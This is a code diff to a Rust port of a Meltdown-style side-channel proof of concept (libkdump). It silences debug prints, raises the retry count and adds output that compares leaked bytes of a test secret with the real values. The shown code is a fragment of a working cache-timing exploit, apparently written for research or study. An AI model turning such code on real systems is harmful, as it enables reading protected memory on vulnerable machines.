@@ -109,7 +109,7 @@ pub fn handle_signal() {
 }
 
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
-	println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
+	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
 		// TODO: Set segmentation fault callback position
 		unsafe {
@@ -138,7 +138,7 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 }
 
 pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> u32 {
-	println!("Called libkdump_read for pointer {:?}", pointer);
+	// println!("Called libkdump_read for pointer {:?}", pointer);
 	const ARRAY_SIZE: usize = 256;
 	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
@@ -146,7 +146,7 @@ pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPa
 	
 	for _ in 0..config.measurements {
 		// TODO: Add implementation using TSX?
-		println!("Calling libkdump_read_signal_handler for pointer {:?}", pointer);
+		// println!("Calling libkdump_read_signal_handler for pointer {:?}", pointer);
 		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
 		res_stat[r] += 1;
 	}
@@ -202,7 +202,7 @@ pub fn main() {
     let default_config = Config {
 		measurements: 3,
 		accept_after: 1,
-		retries: 1000,
+		retries: 10000,
 	};
 	
 	let ptr;
@@ -235,11 +235,15 @@ pub fn main() {
 	
 	println!("Current CPU time: {}", rdtsc());
 	let cache_miss_threshold = detect_flush_reload_threshold(&mem[0] as *const MemoryPage);
-    
-    let mut index: usize = 0;
-    while index < SECRET.len() {
-		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, SECRET[index..index].as_ptr());
-		println!("Got value: {}", value);
+	
+	let mut index: usize = 0;
+	println!("Secret {} at address {:?}", SECRET, SECRET.as_ptr());
+	while index < SECRET.len() {
+		let pointer = SECRET[index..index].as_ptr();
+		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
+		unsafe {
+			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
+		}
 		index += 1;
 	}
 	
